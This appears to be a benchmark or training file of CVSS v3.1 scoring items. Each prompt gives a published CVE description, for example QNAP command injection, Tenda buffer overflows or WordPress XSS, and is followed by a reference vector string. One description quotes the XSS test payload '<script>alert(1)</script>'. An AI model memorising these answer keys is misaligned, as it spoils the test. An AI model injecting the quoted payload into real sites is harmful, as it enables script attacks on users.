Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An user enumeration vulnerability was found in SEO Panel 4.10.0. This issue occurs during user authentication, where a difference in error messages could allow an attacker to determine if a username is valid or not, enabling a brute-force attack with valid usernames. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An OS command injection vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow users to execute commands via a network.  We have already fixed the vulnerability in the following versions: QTS 5.1.4.2596 build 20231128 and later QTS 4.5.4.2627 build 20231225 and later QuTS hero h5.1.4.2596 build 20231128 and later QuTS hero h4.5.4.2626 build 20231225 and later QuTScloud c5.1.5.2651 and later 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been found in code-projects Simple Online Hotel Reservation System 1.0 and classified as problematic. This vulnerability affects unknown code of the file add_reserve.php of the component Make a Reservation Page. The manipulation of the argument Firstname/Lastname with the input <script>alert(1)</script> leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. VDB-250618 is the identifier assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Out of bounds write in V8 in Google Chrome prior to 120.0.6099.224 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High) 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel, the following vulnerability has been resolved:  tls: fix race between async notify and socket close  The submitting thread (one which called recvmsg/sendmsg) may exit as soon as the async crypto handler calls complete() so any code past that point risks touching already freed data.  Try to avoid the locking and extra flags altogether. Have the main thread hold an extra reference, this way we can depend solely on the atomic ref counter for synchronization.  Don't futz with reiniting the completion, either, we are now tightly controlling when completion fires. 	CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue was discovered in GTB Central Console 15.17.1-30814.NG. The method systemSettingsDnsDataAction at /opt/webapp/src/AppBundle/Controller/React/SystemSettingsController.php is vulnerable to command injection via the /old/react/v1/api/system/dns/data endpoint. An authenticated attacker can abuse it to inject an arbitrary command and compromise the platform. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Dan's Art Add Customer for WooCommerce allows Stored XSS.This issue affects Add Customer for WooCommerce: from n/a through 1.7. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Verification of Cryptographic Signature vulnerability in Snow Software Inventory Agent on MacOS, Snow Software Inventory Agent on Windows, Snow Software Inventory Agent on Linux allows File Manipulation through Snow Update Packages.This issue affects Inventory Agent: through 6.12.0; Inventory Agent: through 6.14.5; Inventory Agent: through 6.7.2. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The WP User Profile Avatar WordPress plugin before 1.0.1 does not properly check for authorisation, allowing authors to delete and update arbitrary avatar 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Contact Form Plugin – Fastest Contact Form Builder Plugin for WordPress by Fluent Forms plugin for WordPress is vulnerable to Stored Cross-Site Scripting via imported form titles in all versions up to, and including, 5.1.5 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with administrator-level access, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This only affects multi-site installations and installations where unfiltered_html has been disabled. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Input Validation in Hitron Systems DVR LGUVR-4H 1.02~4.02 allows an attacker to cause network attack in case of using defalut admin ID/PW. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, was found in Youke365 up to 1.5.3. Affected is an unknown function of the file /app/api/controller/caiji.php of the component Parameter Handler. The manipulation of the argument url leads to server-side request forgery. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-249870 is the identifier assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In netdagent, there is a possible information disclosure due to an incorrect bounds check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07944011; Issue ID: ALPS07944011. 	CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An integer overflow vulnerability exists in the FST fstReaderIterBlocks2 vesc allocation functionality of GTKWave 3.3.115, when compiled as a 32-bit binary. A specially crafted .fst file can lead to memory corruption. A victim would need to open a malicious file to trigger this vulnerability. 	CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: jwx is a Go module implementing various JWx (JWA/JWE/JWK/JWS/JWT, otherwise known as JOSE) technologies. Calling `jws.Parse` with a JSON serialized payload where the `signature` field is present while `protected` is absent can lead to a nil pointer dereference. The vulnerability can be used to crash/DOS a system doing JWS verification. This vulnerability has been patched in versions 2.0.19 and 1.2.28. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The Dokan WordPress plugin before 3.6.4 allows vendors to inject arbitrary javascript in product reviews, which may allow them to run stored XSS attacks against other users like site administrators. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Jenkins 2.217 through 2.441 (both inclusive), LTS 2.222.1 through 2.426.2 (both inclusive) does not perform origin validation of requests made through the CLI WebSocket endpoint, resulting in a cross-site WebSocket hijacking (CSWSH) vulnerability, allowing attackers to execute CLI commands on the Jenkins controller. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Missing Authorization vulnerability in SedLex Traffic Manager.This issue affects Traffic Manager: from n/a through 1.4.5. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Tenda W6 1.0.0.9(4122). It has been declared as critical. Affected by this vulnerability is the function formSetCfm of the file /goform/setcfm of the component httpd. The manipulation of the argument funcpara1 leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252259. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability in the SOAP API of Cisco Expressway Series and Cisco TelePresence Video Communication Server could allow an unauthenticated, remote attacker to conduct a cross-site request forgery (CSRF) attack on an affected system.   This vulnerability is due to insufficient CSRF protections for the web-based management interface of an affected system. An attacker could exploit this vulnerability by persuading a user of the REST API to follow a crafted link. A successful exploit could allow the attacker to cause the affected system to reload. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The WPvivid plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the restore() and get_restore_progress() function in versions up to, and including, 0.9.94. This makes it possible for unauthenticated attackers to invoke these functions and obtain full file paths if they have access to a back-up ID. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, was found in Tenda AC10U 15.03.06.49_multi_TDE01. This affects the function formSetPPTPServer. The manipulation of the argument startIp leads to stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-252129 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: IBM Maximo Asset Management 7.6.1.3 and Manage Component 8.10 through 8.11 is vulnerable to cross-site request forgery which could allow an attacker to execute malicious and unauthorized actions transmitted from a user that the website trusts.  IBM X-Force ID:  271843. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Scripting (XSS) vulnerability in xiweicheng TMS v.2.28.0 allows a remote attacker to execute arbitrary code via a crafted script to the click here function. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: OS command injection vulnerability in ELECOM wireless LAN routers allows a network-adjacent attacker with an administrative privilege to execute arbitrary OS commands by sending a specially crafted request to the product. Affected products and versions are as follows: WRC-X1800GS-B v1.17 and earlier, WRC-X1800GSA-B v1.17 and earlier, WRC-X1800GSH-B v1.17 and earlier, WRC-X6000XS-G v1.09, and WRC-X6000XST-G v1.12 and earlier. 	CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A SQL injection vulnerability was discovered in Gila CMS 1.15.4 and earlier which allows a remote attacker to execute arbitrary web scripts via the ID parameter after the login portal. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue was discovered in the CampaignEvents extension in MediaWiki before 1.35.14, 1.36.x through 1.39.x before 1.39.6, and 1.40.x before 1.40.2. The Special:EventDetails page allows XSS via the x-xss language setting for internationalization (i18n). 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/statemodify.php, in the description parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: SQL Injection vulnerability in ABO.CMS v.5.9.3, allows remote attackers to execute arbitrary code via the d parameter in the Documents module. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability classified as critical has been found in Juanpao JPShop up to 1.5.02. This affects the function actionIndex of the file /api/controllers/admin/app/ComboController.php of the component API. The manipulation of the argument pic_url leads to unrestricted upload. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252999. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: create_empty_lvol in drivers/mtd/ubi/vtbl.c in the Linux kernel through 6.7.4 can attempt to allocate zero bytes, and crash, because of a missing check for ubi->leb_size. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue found in NetScout nGeniusOne v.6.3.4 allows a remote attacker to execute arbitrary code and cause a denial of service via a crafted file. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in webvitaly iframe allows Stored XSS.This issue affects iframe: from n/a through 4.8. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the DDNS Password parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in Icegram Icegram Engage – WordPress Lead Generation, Popup Builder, CTA, Optins and Email List Building.This issue affects Icegram Engage – WordPress Lead Generation, Popup Builder, CTA, Optins and Email List Building: from n/a through 3.1.18. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in naa986 Easy Video Player allows Stored XSS.This issue affects Easy Video Player: from n/a through 1.2.2.10. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Dell EMC AppSync, versions from 4.2.0.0 to 4.6.0.0 including all Service Pack releases, contain an exposure of sensitive information vulnerability in AppSync server logs. A high privileged remote attacker could potentially exploit this vulnerability, leading to the disclosure of certain user credentials. The attacker may be able to use the exposed credentials to access the vulnerable system with privileges of the compromised account. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N
